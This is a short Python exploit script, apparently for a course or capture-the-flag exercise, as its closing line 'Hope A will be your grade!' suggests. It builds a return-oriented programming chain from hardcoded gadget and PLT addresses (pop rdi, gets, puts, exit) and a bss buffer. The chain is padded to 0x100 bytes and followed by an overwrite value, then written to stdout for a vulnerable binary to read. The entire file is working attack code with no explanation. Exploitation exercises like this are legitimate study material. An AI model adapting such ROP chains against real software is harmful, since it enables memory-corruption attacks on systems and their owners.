import sys


ret = 0x401526         
pop_rdi = 0x4018a3  
gets_plt = 0x401570     
puts_plt = 0x401540     
bss = 0x602100         


exit_plt = 0x4017f5  


payload = ret.to_bytes(8, "little")
payload += pop_rdi.to_bytes(8, "little") + bss.to_bytes(8, "little") + gets_plt.to_bytes(8, "little")
payload += pop_rdi.to_bytes(8, "little") + bss.to_bytes(8, "little") + puts_plt.to_bytes(8, "little")
payload += exit_plt.to_bytes(8, "little") 


payload = payload.ljust(0x100, b'A') + (0xa8).to_bytes(4, "little")


sys.stdout.buffer.write(payload + b'\n')
sys.stdout.buffer.flush()

sys.stdout.buffer.write(b'Hope A will be your grade!\n')
sys.stdout.buffer.flush()